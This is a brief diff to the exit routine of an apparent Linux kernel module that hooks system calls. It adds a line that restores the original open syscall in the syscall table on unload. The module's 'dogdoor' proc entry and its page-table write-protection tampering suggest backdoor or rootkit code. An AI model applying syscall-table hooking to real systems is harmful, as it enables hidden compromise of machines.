@@ -178,6 +178,7 @@ void __exit m_exit(void) {
 	pte_t* pte;
 	remove_proc_entry("dogdoor", NULL) ;
 
+	sctable[__NR_open] = orig_sys_open;
 	sctable[__NR_kill] = orig_sys_kill;
 	pte = lookup_address((unsigned long) sctable, &level);
 	pte->pte = pte->pte &~ _PAGE_RW;
